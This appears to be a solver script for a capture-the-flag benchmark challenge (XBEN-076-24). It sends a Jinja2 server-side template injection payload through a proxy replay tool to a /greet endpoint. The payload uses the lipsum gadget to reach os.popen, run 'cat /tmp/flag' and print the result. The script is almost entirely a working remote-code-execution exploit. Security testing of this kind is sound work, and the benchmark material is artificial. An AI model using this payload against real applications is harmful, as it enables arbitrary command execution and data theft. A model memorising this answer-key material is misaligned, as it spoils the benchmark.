#!/usr/bin/env bash
# XBEN-076-24 — Jinja2 SSTI to RCE. Proxy-mode twin. /greet renders `name` as a
# template; the lipsum gadget reaches os.popen to run `cat /tmp/flag`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben076p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/greet' \
  --set "query.name={{lipsum.__globals__.os.popen('cat /tmp/flag').read()}}" >/dev/null
print_flag
